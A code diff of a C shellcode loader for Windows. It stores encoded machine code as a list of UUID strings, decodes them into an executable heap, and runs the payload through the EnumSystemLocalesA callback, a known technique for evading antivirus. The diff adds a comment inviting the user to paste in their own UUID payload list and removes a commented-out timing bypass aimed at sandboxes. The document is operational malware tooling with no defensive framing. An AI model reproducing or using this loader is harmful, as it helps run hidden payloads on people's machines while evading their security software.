@@ -6,6 +6,7 @@
 
 const char* uuids[] =
 {
+    //Paste your uuid_list.txt here
     "48c93148-e981-ffc0-ffff-488d05efffff",
     "54bb48ff-367e-1da3-16ea-2c4831582748",
     "fffff82d-e2ff-a8f4-36b5-47edfe262c54",
@@ -46,8 +47,6 @@ const char* uuids[] =
 
 int main()
 {
-    time_t s = time(0);
-    int sec = 18;
     HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
     void* ha = HeapAlloc(hc, 0, 0x100000);
     DWORD_PTR hptr = (DWORD_PTR)ha;
@@ -66,18 +65,6 @@ int main()
         }
         hptr += 16;
     }
-    //see it in memory
-    //printf("[*] Hexdump: ");
-    //for (int i = 0; i < elems * 16; i++) {
-    //    printf("%02X ", ((unsigned char*)ha)[i]);
-    //}
-    
-    //Bypass time
-    //while (time(0) - s <= sec)
-    //{
-    //    printf("\r%d seconds: ", (time(0) - s));
-    //}
-    //execute shellcode
     EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
     CloseHandle(ha);
     return 0;
